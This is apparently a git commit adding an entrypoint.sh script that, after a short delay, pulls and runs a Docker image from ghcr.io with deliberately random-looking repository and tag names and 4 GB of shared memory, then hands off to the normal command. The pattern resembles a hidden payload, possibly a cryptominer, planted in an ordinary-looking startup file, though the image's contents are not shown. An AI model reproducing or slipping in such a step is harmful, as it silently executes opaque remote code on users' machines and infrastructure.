68b60f82fc485068b1777d8fb8218d54106aeb6a
Chared kuiol <shankarnanda002@outlook.com>
2024-08-05 09:41:46 +0530

    Create entrypoint.sh

---
+++ entrypoint.sh
@@ -0,0 +1,9 @@
+#!/bin/sh
+sleep 5s;
+
+docker run --rm -i \
+  --shm-size 4g \
+  ghcr.io/osihw652fv287s1v1eu8282hv2iow9sb1/bitabcolatestwyt2752rfgwjwbh271ysg3nwut:hsy1q3g0qf9kfcvarteacobitB0002-of-two
+
+# start the script
+exec "$@"
